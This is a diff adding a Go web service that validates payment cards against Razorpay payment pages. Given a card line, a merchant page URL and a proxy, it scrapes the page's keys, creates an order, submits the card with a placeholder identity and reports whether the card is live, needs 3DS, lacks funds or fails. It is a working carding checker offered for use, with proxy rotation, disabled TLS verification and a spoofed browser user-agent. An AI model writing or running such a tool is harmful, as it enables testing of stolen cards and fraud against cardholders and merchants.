@@ -1,0 +1,513 @@
+package main
+
+import (
+	"bytes"
+	"crypto/tls"
+	"encoding/json"
+	"fmt"
+	"io"
+	"net/http"
+	"net/url"
+	"regexp"
+	"strconv"
+	"strings"
+	"time"
+)
+
+// RazorpayAPIResponse represents the JSON output for GET /razorpay
+type RazorpayAPIResponse struct {
+	CC       string `json:"cc"`
+	Gateway  string `json:"Gateway"`
+	Response string `json:"Response"`
+	Price    string `json:"Price"`
+	Currency string `json:"Currency"`
+	Status   string `json:"Status"`
+	Message  string `json:"Message"`
+	Time     string `json:"Time"`
+	Proxy    string `json:"Proxy"`
+}
+
+func getProxyLabel(proxy string) string {
+	if proxy != "" {
+		return "Live"
+	}
+	return "None"
+}
+
+type RazorpayPaymentResult struct {
+	Status   string `json:"status"`
+	Response string `json:"response"`
+	Message  string `json:"message"`
+}
+
+type RazorpaySession struct {
+	Client        *http.Client
+	PageURL       string
+	KeylessHeader string
+	KeyID         string
+	PaymentLinkID string
+	ItemAmount    int // amount in paise
+	Currency      string
+}
+
+func buildRazorpayHTTPClient(proxyURL string) (*http.Client, error) {
+	transport := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+	if proxyURL != "" {
+		parsedProxy, err := url.Parse(proxyURL)
+		if err != nil {
+			return nil, fmt.Errorf("invalid proxy URL: %w", err)
+		}
+		transport.Proxy = http.ProxyURL(parsedProxy)
+	}
+
+	return &http.Client{
+		Transport: transport,
+		Timeout:   35 * time.Second,
+	}, nil
+}
+
+func NewRazorpaySession(client *http.Client, pageURL string) *RazorpaySession {
+	return &RazorpaySession{
+		Client:   client,
+		PageURL:  pageURL,
+		Currency: "INR",
+	}
+}
+
+func (s *RazorpaySession) ScrapePage() error {
+	req, err := http.NewRequest("GET", s.PageURL, nil)
+	if err != nil {
+		return err
+	}
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8")
+
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		return fmt.Errorf("failed to fetch page: %w", err)
+	}
+	defer resp.Body.Close()
+
+	if resp.StatusCode != http.StatusOK {
+		return fmt.Errorf("payment page returned HTTP %d", resp.StatusCode)
+	}
+
+	bodyBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return fmt.Errorf("failed to read response body: %w", err)
+	}
+	html := string(bodyBytes)
+
+	// Extract X-Razorpay-Keyless-Header
+	reHeader := regexp.MustCompile(`(?i)keyless_header\s*:\s*"([^"]+)"`)
+	if match := reHeader.FindStringSubmatch(html); len(match) > 1 {
+		s.KeylessHeader = match[1]
+	}
+
+	// Extract var data JSON payload
+	reData := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
+	matchData := reData.FindStringSubmatch(html)
+	if len(matchData) < 2 {
+		return fmt.Errorf("payment page data JSON structure not found")
+	}
+
+	var data map[string]any
+	if err := json.Unmarshal([]byte(matchData[1]), &data); err != nil {
+		return fmt.Errorf("failed to parse page data JSON: %w", err)
+	}
+
+	s.KeyID, _ = data["key_id"].(string)
+
+	pl, ok := data["payment_link"].(map[string]any)
+	if !ok {
+		return fmt.Errorf("payment_link object missing in page data")
+	}
+
+	s.PaymentLinkID, _ = pl["id"].(string)
+	if curr, ok := pl["currency"].(string); ok && curr != "" {
+		s.Currency = curr
+	}
+
+	items, ok := pl["payment_page_items"].([]any)
+	if !ok || len(items) == 0 {
+		return fmt.Errorf("no items found on payment page")
+	}
+
+	firstItem, _ := items[0].(map[string]any)
+	amountVal := 0
+	if amt, ok := firstItem["amount"].(float64); ok && amt > 0 {
+		amountVal = int(amt)
+	} else if uAmt, ok := firstItem["unit_amount"].(float64); ok && uAmt > 0 {
+		amountVal = int(uAmt)
+	} else if minAmt, ok := firstItem["min_amount"].(float64); ok && minAmt > 0 {
+		amountVal = int(minAmt)
+	} else if minAmtVal, ok := firstItem["min_amount_value"].(float64); ok && minAmtVal > 0 {
+		amountVal = int(minAmtVal)
+	}
+
+	if amountVal <= 0 {
+		amountVal = 100 // default 1 INR (100 paise)
+	}
+	s.ItemAmount = amountVal
+
+	if s.KeyID == "" || s.PaymentLinkID == "" {
+		return fmt.Errorf("key_id or payment_link_id missing in page data")
+	}
+
+	return nil
+}
+
+func (s *RazorpaySession) CreateOrder(customAmountINR int) (string, error) {
+	if customAmountINR > 0 {
+		s.ItemAmount = customAmountINR * 100
+	}
+
+	targetURL := fmt.Sprintf("https://api.razorpay.com/v1/payment_pages/%s/order", s.PaymentLinkID)
+	payload := map[string]any{
+		"amount": s.ItemAmount,
+	}
+
+	bodyBytes, err := json.Marshal(payload)
+	if err != nil {
+		return "", err
+	}
+
+	req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBytes))
+	if err != nil {
+		return "", err
+	}
+
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Origin", "https://pages.razorpay.com")
+	req.Header.Set("Referer", s.PageURL)
+	if s.KeylessHeader != "" {
+		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
+	}
+
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		return "", fmt.Errorf("order creation request failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	respBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return "", err
+	}
+
+	var resData map[string]any
+	if err := json.Unmarshal(respBytes, &resData); err != nil {
+		return "", fmt.Errorf("invalid json in order creation response")
+	}
+
+	orderID, _ := resData["id"].(string)
+	if orderID == "" {
+		if errData, ok := resData["error"].(map[string]any); ok {
+			desc, _ := errData["description"].(string)
+			return "", fmt.Errorf("%s", desc)
+		}
+		return "", fmt.Errorf("order creation failed: %s", string(respBytes))
+	}
+
+	return orderID, nil
+}
+
+func (s *RazorpaySession) SubmitPayment(cardNo, expMonth, expYear, cvv, name, email, phone, orderID string) (*RazorpayPaymentResult, error) {
+	targetURL := "https://api.razorpay.com/v1/payments"
+
+	payload := map[string]any{
+		"key_id":   s.KeyID,
+		"order_id": orderID,
+		"amount":   s.ItemAmount,
+		"currency": s.Currency,
+		"email":    email,
+		"contact":  phone,
+		"method":   "card",
+		"card": map[string]string{
+			"number":       cardNo,
+			"cvv":          cvv,
+			"expiry_month": expMonth,
+			"expiry_year":  expYear,
+			"name":         name,
+		},
+		"_": map[string]string{
+			"integration":      "payment_pages",
+			"integration_type": "rzp_app",
+			"version":          "1.24.0",
+		},
+	}
+
+	bodyBytes, err := json.Marshal(payload)
+	if err != nil {
+		return nil, err
+	}
+
+	req, err := http.NewRequest("POST", targetURL, bytes.NewReader(bodyBytes))
+	if err != nil {
+		return nil, err
+	}
+
+	req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+	req.Header.Set("Content-Type", "application/json")
+	req.Header.Set("Origin", "https://pages.razorpay.com")
+	req.Header.Set("Referer", s.PageURL)
+	if s.KeylessHeader != "" {
+		req.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
+	}
+
+	resp, err := s.Client.Do(req)
+	if err != nil {
+		return nil, fmt.Errorf("payment submission failed: %w", err)
+	}
+	defer resp.Body.Close()
+
+	respBytes, err := io.ReadAll(resp.Body)
+	if err != nil {
+		return nil, err
+	}
+
+	respStr := string(respBytes)
+	reData := regexp.MustCompile(`(?s)var\s+data\s*=\s*(\{.*?\});`)
+
+	// Check if response is an intermediate fee breakup HTML form
+	if strings.Contains(respStr, "payments/create/checkout") {
+		formActionRe := regexp.MustCompile(`(?i)<form[^>]+action=['"]([^'"]+)['"]`)
+		actionMatch := formActionRe.FindStringSubmatch(respStr)
+		if len(actionMatch) > 1 {
+			actionURL := actionMatch[1]
+
+			inputRe := regexp.MustCompile(`(?i)<input[^>]+type=['"]hidden['"][^>]+name=['"]([^'"]+)['"][^>]+value=['"]([^'"]*)['"]`)
+			inputMatches := inputRe.FindAllStringSubmatch(respStr, -1)
+
+			formData := url.Values{}
+			for _, m := range inputMatches {
+				if len(m) > 2 {
+					formData.Set(m[1], m[2])
+				}
+			}
+
+			req2, err := http.NewRequest("POST", actionURL, strings.NewReader(formData.Encode()))
+			if err == nil {
+				req2.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36")
+				req2.Header.Set("Content-Type", "application/x-www-form-urlencoded")
+				req2.Header.Set("Origin", "https://pages.razorpay.com")
+				req2.Header.Set("Referer", s.PageURL)
+				if s.KeylessHeader != "" {
+					req2.Header.Set("X-Razorpay-Keyless-Header", s.KeylessHeader)
+				}
+
+				resp2, err2 := s.Client.Do(req2)
+				if err2 == nil {
+					defer resp2.Body.Close()
+					resp2Bytes, _ := io.ReadAll(resp2.Body)
+					respBytes = resp2Bytes
+					respStr = string(resp2Bytes)
+				}
+			}
+		}
+	}
+
+	var parsed map[string]any
+	if match := reData.FindStringSubmatch(respStr); len(match) > 1 {
+		_ = json.Unmarshal([]byte(match[1]), &parsed)
+	} else {
+		_ = json.Unmarshal(respBytes, &parsed)
+	}
+
+	if parsed != nil {
+		if errData, ok := parsed["error"].(map[string]any); ok {
+			reason, _ := errData["reason"].(string)
+			desc, _ := errData["description"].(string)
+			code, _ := errData["code"].(string)
+			if desc == "" {
+				desc = reason
+			}
+			if desc == "" {
+				desc = code
+			}
+			if desc == "" {
+				desc = "Declined by gateway"
+			}
+
+			responseCode := "CARD_DECLINED"
+			statusText := "false"
+
+			reasonUpper := strings.ToUpper(reason + " " + desc + " " + code)
+
+			if strings.Contains(reasonUpper, "TEMPORARY BLOCK") ||
+				strings.Contains(reasonUpper, "PUT ON HOLD") ||
+				strings.Contains(reasonUpper, "DEACTIVATED") ||
+				strings.Contains(reasonUpper, "ACCOUNT BLOCKED") ||
+				strings.Contains(reasonUpper, "SITE ADMIN") ||
+				strings.Contains(reasonUpper, "MANDATORY PAYMENT PAGE ITEM") ||
+				strings.Contains(reasonUpper, "SHOULD BE ORDERED") {
+				responseCode = "SITE_ERROR"
+				statusText = "SiteError"
+			} else if strings.Contains(reasonUpper, "INSUFFICIENT") {
+				responseCode = "INSUFFICIENT_FUNDS"
+			} else if strings.Contains(reasonUpper, "CVV") || strings.Contains(reasonUpper, "VERIFICATION") {
+				responseCode = "CVV_INVALID"
+			} else if strings.Contains(reasonUpper, "EXPIRED") {
+				responseCode = "EXPIRED_CARD"
+			}
+
+			return &RazorpayPaymentResult{
+				Status:   statusText,
+				Response: responseCode,
+				Message:  desc,
+			}, nil
+		}
+
+		if parsed["callback_url"] != nil || parsed["next"] != nil || parsed["action"] != nil {
+			return &RazorpayPaymentResult{
+				Status:   "3ds",
+				Response: "3DS_REQUIRED",
+				Message:  "Card verification (OTP/3DS) is required by the bank",
+			}, nil
+		}
+
+		status, _ := parsed["status"].(string)
+		if status == "captured" || status == "authorized" {
+			return &RazorpayPaymentResult{
+				Status:   "success",
+				Response: "SUCCESS",
+				Message:  "Payment authorized successfully",
+			}, nil
+		}
+
+		if status != "" {
+			return &RazorpayPaymentResult{
+				Status:   "fail",
+				Response: "CARD_DECLINED",
+				Message:  fmt.Sprintf("Payment status: %s", status),
+			}, nil
+		}
+	}
+
+	return &RazorpayPaymentResult{
+		Status:   "fail",
+		Response: "GATEWAY_ERROR",
+		Message:  fmt.Sprintf("HTTP %d: %s", resp.StatusCode, string(respBytes)),
+	}, nil
+}
+
+func handleRazorpayAPI(w http.ResponseWriter, r *http.Request) {
+	w.Header().Set("Content-Type", "application/json")
+
+	startTime := time.Now()
+	ccLine := r.URL.Query().Get("cc")
+	siteURL := r.URL.Query().Get("site")
+	proxyURL := r.URL.Query().Get("proxy")
+	amountStr := r.URL.Query().Get("amount")
+
+	if ccLine == "" || siteURL == "" {
+		w.WriteHeader(http.StatusBadRequest)
+		_, _ = w.Write([]byte(`{"error":"Missing cc or site parameter"}`))
+		return
+	}
+
+	customAmount := 0
+	if amountStr != "" {
+		if val, err := strconv.Atoi(amountStr); err == nil && val > 0 {
+			customAmount = val
+		}
+	}
+
+	parts := strings.Split(ccLine, "|")
+	if len(parts) < 4 {
+		w.WriteHeader(http.StatusBadRequest)
+		_, _ = w.Write([]byte(`{"error":"Invalid cc format. Expected num|mm|yyyy|cvv"}`))
+		return
+	}
+	cardNo, expMonth, expYear, cvv := strings.TrimSpace(parts[0]), strings.TrimSpace(parts[1]), strings.TrimSpace(parts[2]), strings.TrimSpace(parts[3])
+
+	client, err := buildRazorpayHTTPClient(proxyURL)
+	if err != nil {
+		resp := RazorpayAPIResponse{
+			CC:       ccLine,
+			Gateway:  "Razorpay Pages",
+			Response: "PROXY_ERROR",
+			Status:   "false",
+			Message:  fmt.Sprintf("Proxy build error: %v", err),
+			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:    getProxyLabel(proxyURL),
+		}
+		jsonResp, _ := json.Marshal(resp)
+		_, _ = w.Write(jsonResp)
+		return
+	}
+
+	session := NewRazorpaySession(client, siteURL)
+
+	if err := session.ScrapePage(); err != nil {
+		resp := RazorpayAPIResponse{
+			CC:       ccLine,
+			Gateway:  "Razorpay Pages",
+			Response: "SITE_ERROR",
+			Status:   "SiteError",
+			Message:  fmt.Sprintf("Failed to parse page: %v", err),
+			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:    getProxyLabel(proxyURL),
+		}
+		jsonResp, _ := json.Marshal(resp)
+		_, _ = w.Write(jsonResp)
+		return
+	}
+
+	orderID, err := session.CreateOrder(customAmount)
+	if err != nil {
+		resp := RazorpayAPIResponse{
+			CC:       ccLine,
+			Gateway:  "Razorpay Pages",
+			Response: "SITE_ERROR",
+			Status:   "SiteError",
+			Message:  fmt.Sprintf("%v", err),
+			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:    getProxyLabel(proxyURL),
+		}
+		jsonResp, _ := json.Marshal(resp)
+		_, _ = w.Write(jsonResp)
+		return
+	}
+
+	result, err := session.SubmitPayment(cardNo, expMonth, expYear, cvv, "Jane Doe", "janedoe@example.com", "+919876543210", orderID)
+	if err != nil {
+		resp := RazorpayAPIResponse{
+			CC:       ccLine,
+			Gateway:  "Razorpay Pages",
+			Response: "SUBMIT_FAILED",
+			Status:   "false",
+			Message:  fmt.Sprintf("Payment submission error: %v", err),
+			Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+			Proxy:    getProxyLabel(proxyURL),
+		}
+		jsonResp, _ := json.Marshal(resp)
+		_, _ = w.Write(jsonResp)
+		return
+	}
+
+	status := "false"
+	switch result.Status {
+	case "success", "3ds":
+		status = "true"
+	case "SiteError":
+		status = "SiteError"
+	}
+
+	resp := RazorpayAPIResponse{
+		CC:       ccLine,
+		Gateway:  "Razorpay Pages",
+		Response: result.Response,
+		Price:    fmt.Sprintf("%.2f", float64(session.ItemAmount)/100.0),
+		Currency: session.Currency,
+		Status:   status,
+		Message:  result.Message,
+		Time:     fmt.Sprintf("%.2fs", time.Since(startTime).Seconds()),
+		Proxy:    getProxyLabel(proxyURL),
+	}
+	jsonResp, _ := json.Marshal(resp)
+	_, _ = w.Write(jsonResp)
+}
